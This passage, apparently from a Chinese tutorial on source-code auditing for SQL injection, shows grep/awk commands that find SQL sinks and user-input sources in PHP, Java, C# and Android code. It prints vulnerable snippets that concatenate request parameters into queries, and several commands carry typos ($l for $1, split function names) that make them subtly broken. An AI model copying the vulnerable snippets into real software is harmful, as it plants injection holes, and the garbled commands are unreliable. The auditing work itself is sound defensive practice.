class=\"language-bash\">filename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">20</span>\nmatch: <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM table WHERE field = '$ input'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>又不能判断$input 是否被污染，跟踪$input</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"\\<span class=\"token variable\">$input</span>=.*\\$.*\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F:\t<span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>理想结果</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">filename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">10</span>\nmatch: <span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>但是还是不能断定存在SQL注入，因为可以存在对$input的过滤</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"\\<span class=\"token variable\">$input</span>\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">filename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">11</span>\nmatch: <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>is_string<span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">))</span>\t<span class=\"token punctuation\">{</span>\nfilename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">12</span>\nmatch: <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>strlen<span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$maxlength</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\nfilename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">13</span>\nmatch: <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ctype_alnum<span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">))</span>\t<span class=\"token punctuation\">{</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>经过对过滤函数的分析，就能判断是否存在SQL注入</p>\n<h5 id=\"跟踪Java中的数据\"><a href=\"#跟踪Java中的数据\" class=\"headerlink\" title=\"跟踪Java中的数据\"></a>跟踪Java中的数据</h5><p>在Java源文件的目录中，寻找是否存在使用了 prepareStatement()、 executeQuery()、executeUpdate()、addBatch()和 executeBatch()的文件</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"preparedStatement(\\|executeQuery(\\|executeUpdate(\\|exe cute(\\|addBatch(\\|executeBatch(\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F:\t<span class=\"token string\">'{print \"filename:\"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>获得</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">filename: src/SQLVuln.java\nline: <span class=\"token number\">89</span>\nmatch: ResultSet rs <span class=\"token operator\">=</span> statement.executeQuery<span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfilename: src/SQLVuln.java\nline: <span class=\"token number\">139</span>\nmatch: statement.executeUpdate<span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfilename: src/SQLVuln.java\nline: <span class=\"token number\">209</span>\nmatch: ResultSet rs <span class=\"token operator\">=</span> statement.executeQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"\nSELECT field FROM table WHERE field = \"</span> +\nrequest.getParameter<span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>209行<code>input</code>是用户直接通过表单提交输入，存在SQL注入</p>\n<p>还需对89,139行的sql进行跟踪判断是否被污染</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> - i <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"sql =.*<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\\(SELECT\\|UPDATE\\|INSERT\\|DROP\\)\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span>\nfilename: src/SQLVuln.java\nline: <span class=\"token number\">88</span>\nmatch: String sql <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT field FROM table WHERE field = \"</span> + request.getParameter<span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span>\nfilename: src/SQLVuln.java\nline: <span class=\"token number\">138</span>\nmatch: String sql <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"INSERT INTO table VALUES field = (\"</span> +\nrequest.getParameter <span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span> + <span class=\"token string\">\") WHERE field = \"</span> + request. getParameter <span class=\"token punctuation\">(</span><span class=\"token string\">\"more-input\"</span><span class=\"token punctuation\">)</span> + \"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>和前面一样，也存在SQL注入</p>\n<p>找到渗入源</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"getParameter(\\|getParameterValues(\\|getQueryString (\\|getHeader(\\|getHeaders(\\|getRequestedSessionld(\\|getCookies(\\|getValue(\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"跟踪C-中的数据\"><a href=\"#跟踪C-中的数据\" class=\"headerlink\" title=\"跟踪C#中的数据\"></a>跟踪C#中的数据</h5><p>在一个C#源文件的目录中，寻找使用了 SqlCommand()、SqlParameter()、OleDbCommand()、OleDbParameter()、OracleCommand()、OracleParameter() 、OdbcCommand()和 OdbcParameter()的位置</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"SqlCommand(\\|SqlParameter(\\|OleDbCommand(\\|OleDbParam eter(\\|OracleCommand(\\|OracleParameter(\\|OdbcCommand(\\|OdbcParameter(\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span>\nfilename: src/SQLiMSSQLVuln.cs\nline: <span class=\"token number\">29</span>\nmatch: SqlCommand <span class=\"token builtin class-name\">command</span> <span class=\"token operator\">=</span> new SqlCommand<span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT ★ FROM table WHERE field = '\"</span> + request.getParameter<span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span> + <span class=\"token string\">\"'\"</span>,conn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfilename: src/SQLiOracleVuln.cs\nline: <span class=\"token number\">69</span>\nmatch: OracleCommand <span class=\"token builtin class-name\">command</span> <span class=\"token operator\">=</span> new OracleCommand<span class=\"token punctuation\">(</span>sql, conn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>29行<code>input</code>是用户直接通过表单提交输入，存在SQL注入</p>\n<p>还需对69行的sql进行跟踪判断是否被污染</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"sql =.*<span class=\"token entity\" title=\"\\&quot;\">\\\"</span> \\(SELECT\\|UPDATE\\|INSERT\\|DROP\\)\"</span> src/ I <span class=\"token function\">awk</span> -F:\t<span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span>\nfilename: src/SQLiOracleVuln.cs\nline: <span class=\"token number\">68</span>\nmatch: String sql <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM table WHERE field = '\"</span> + request.getParameter<span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span> + <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>和前面一样，也存在SQL注入</p>\n<p>找到渗入源</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"HttpCookieCollection\\|Form\\|Headers\\|Params\\|QuerySt ring\\|Servervariables\\|Url\\|UserAgent\\|UserHostAddress\\|UserHostName\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"复查Android应用程序代码\"><a href=\"#复查Android应用程序代码\" class=\"headerlink\" title=\"复查Android应用程序代码\"></a>复查Android应用程序代码</h4><h5 id=\"工具-1\"><a href=\"#工具-1\" class=\"headerlink\" title=\"工具\"></a>工具</h5><p><a href=\"http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/\">WebContentResolver</a>，它可以运行在Android设备(或模拟器)上，并向 所有已安装的内容提供程序暴露Web Service接口。</p>\n<p>dex2jar这样的工具可以轻而易举地将Android应用程序的包文件(APK) 转换为Java Archive (JAR)文件。然后，可以采用某种Java反汇编程序 比如jdgui或 jad,反编译应用程序并查看源代码。</p>\n<h5 id=\"危险函数\"><a href=\"#危险函数\" class=\"headerlink\" title=\"危险函数\"></a>危险函数</h5><p>Android开发人员使用两个类与SQLite数据库进行交互：<code>SQLiteQueryBuilder</code>类和 <code>SQLiteDatabase</code>类。<code>android.database.sqlite.SQLiteQueryBuilder</code> 是一个便捷类，用于创建发送给SQLiteDatabase对象的SQL查询<code>android.database.sqlite.SQLiteDatabase</code> 类 则提供了用于管理 SQLite 数据库的各种方法。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//android.database.sqlite.SQLiteQueryBuilder</span>\n<span class=\"token comment\">//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句</span>\n<span class=\"token function\">buildQuery</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> projectionIn<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> selection<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> groupBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> having<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> sortOrder<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> limit<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//用指定的子句构造一个SQL查询字符串</span>\n<span class=\"token function\">buildQueryString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> distinct<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> tables<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token class-name\"><span class=\"token namespace\">columns<span class=\"token punctuation\">.</span></span> String</span> <span class=\"token class-name\"><span class=\"token namespace\">where<span class=\"token punctuation\">.</span></span> String</span> groupBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> having<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> orderBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> limit<span class=\"token punctuation\">)</span> \n<span class=\"token comment\">//给定一组子查询，其中每一个都是SELECT语句，构造一个union所有这些子查询返回结果的查询 </span>\n<span class=\"token function\">buildUnionQuery</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> subQueries<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> sortOrder<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> limit<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句</span>\n<span class=\"token function\">buildUnionSubQuery</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> typeDiscriminatorColumn<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> unionColumns<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Set</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> columnsPresentInTable<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> computedColumnsOffset<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> typeDiscriminatorValue<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> selection<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> groupBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> having<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//结合所有当前设置和传递给该方法的信息，这些一个查询</span>\n<span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SQLiteDatabase</span> db<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> projectionin<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> selection<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> groupBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> having<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> sortOrder<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> limit<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//android.database.sqlite.SQLiteDatabase</span>\n<span class=\"token comment\">//在数据库中删除行的简便方法</span>\n<span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> whereClause<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> whereArgs<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//执行单个SQL语句，该SQL语句既不是SELECT语句，也不是任何其他返回数据的SQL语句 </span>\n<span class=\"token function\">execSQL</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> sql<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//执行单个SQL语句，该SQL语句不是SELECT/INSERT/UPDATE/DELETE语句</span>\n<span class=\"token function\">execSQL</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token class-name\"><span class=\"token namespace\">sql<span class=\"token punctuation\">.</span></span> Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bindArgs<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//向数据库插入一行数据的便捷方法</span>\n<span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> nullColumnHack<span class=\"token punctuation\">,</span><span class=\"token class-name\">Contentvalues</span> values<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//向数据库插入一行数据的便捷方法</span>\n<span class=\"token function\">insertOrThrow</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> nullColumnHack<span class=\"token punctuation\">,</span><span class=\"token class-name\">Contentvalues</span> values<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//向数据库插入一行数据的通用方法</span>\n<span class=\"token function\">insertWithOnConflict</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> nullColumnHack<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Contentvalues</span> initialvalues<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> conflictAlgorithm<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//查询指定的表，返回结果集上的一个游标(Cursor)</span>\n<span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> columns<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> selection<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> groupBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> having<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> orderBy<span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span> limit<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//查询指定的URL,返回结果集上的一个游标</span>\n<span class=\"token function\">queryWithFactory</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SQLiteDatabase<span class=\"token punctuation\">.</span>CursorFactory</span> cursorFactory<span class=\"token punctuation\">,</span> <span class=\"token keyword\">boolean</span> distinct<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> columns<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\"><span class=\"token namespace\">selection<span class=\"token punctuation\">.</span></span> String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> groupBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\"><span class=\"token namespace\">having<span class=\"token punctuation\">.</span></span> String</span> orderBy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> limit<span class=\"token punctuation\">)</span> \n<span class=\"token comment\">//运行指定的SQL语句，返回结果集上的一个游标</span>\n<span class=\"token function\">rawQuery</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> sql<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//运行指定的SQL语句，返回结果集上的一个游标</span>\n<span class=\"token function\">rawQueryWithFactory</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SQLiteDatabase<span class=\"token punctuation\">.</span>CursorFactory</span> cursorFactory<span class=\"token punctuation\">,</span>\n<span class=\"token class-name\">String</span> sql<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> editTable<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//替换数据库中数据行的便捷方法</span>\n<span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> nullColumnHack<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Contentvalues</span> initialvalues<span class=\"token punctuation\">)</span> \n<span class=\"token comment\">//替换数据库中数据行的便捷方法</span>\n<span class=\"token function\">replaceOrThrow</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> nullColumnHack<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Contentvalues</span> initialValues<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//更新数据库中数据行的便捷方法</span>\n<span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Contentvalues</span> values<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> whereClause<span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> whereArgs<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//更新数据库中数据行的便捷方法</span>\n<span class=\"token function\">updateWithOnConflict</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> table<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Contentvalues</span> values<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> whereClause<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> whereArgs<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> conflictAlgorithm<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"跟踪数据-1\"><a href=\"#跟踪数据-1\" class=\"headerlink\" title=\"跟踪数据\"></a>跟踪数据</h5><p>通过shell命令在源文件中查找上述类方法</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"delete(\\|execSQL(\\|insert(\\|insertOrThrow(\\|insertWithO nConflict(\\|query(\\|queryWithFactory(\\|rawQuery(\\|rawQueryWithFacto ry(\\|replace(\\|replaceOrThrow(\\|update(\\丨 updateWithOnConflict(\\|buildQuery(\\|buildQueryString(\\|buildUnionQuery(\\|buildUnionSubQuery(\\ | query(\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>搜索包含动态SQL语句的字符串</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"String.*=.*<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\\(SELECT\\|UPDATE\\|INSERT\\|DROP\\)\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'(print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>示例</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ svn checkout http://android-sap-note-viewer.googlecode.com/svn/trunk/sap-note-viewer\n$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"delete(\\|execSQL(\\|insert(\\|insertOrThrow(\\|insertWithOnConflict(\\|query(\\|queryWithFactory(\\|rawQuery(\\|rawQueryWithFactory(\\|replace(\\|replaceOrThrow(\\|update(\\|updateWithOnConflict(\\|buildQuery(\\|buildQueryString(\\|buildUnionQuery(\\|buildUnionSubQuery(\\ | query(\"</span> sap-note-viewer/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F:\t<span class=\"token string\">'{print nfilename: \"$l\"\\nline: \"$2\"\\\nnmatch: \"$3\"\\n\\n\"}'</span>\nfilename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java\nline: <span class=\"token number\">106</span>\nmatch: public Cursor query<span class=\"token punctuation\">(</span>Uri uri, String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> projection, String selection, String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs, String sortOrder<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\nfilename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java\nline: <span class=\"token number\">121</span>\nmatch: Cursor c <span class=\"token operator\">=</span> qBuilder.query<span class=\"token punctuation\">(</span>db, projection, selection, selectionArgs, null, null, sortOrder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>源码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Override</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">Cursor</span> <span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Uri</span> uri<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> projection<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> selection<span class=\"token punctuation\">,</span>\n<span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> selectionArgs<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> sortOrder<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token class-name\">SQLiteQueryBuilder</span> qBuilder <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLiteQueryBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nqBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">setTables</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DATABASE_TABLE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//如果搜索为空，就添加一个通配符，在内容之前和之后添加通配符</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>selectionArgs<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> selectionArgs<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\nselectionArgs<span class=\"token punctuation\">[</span><span 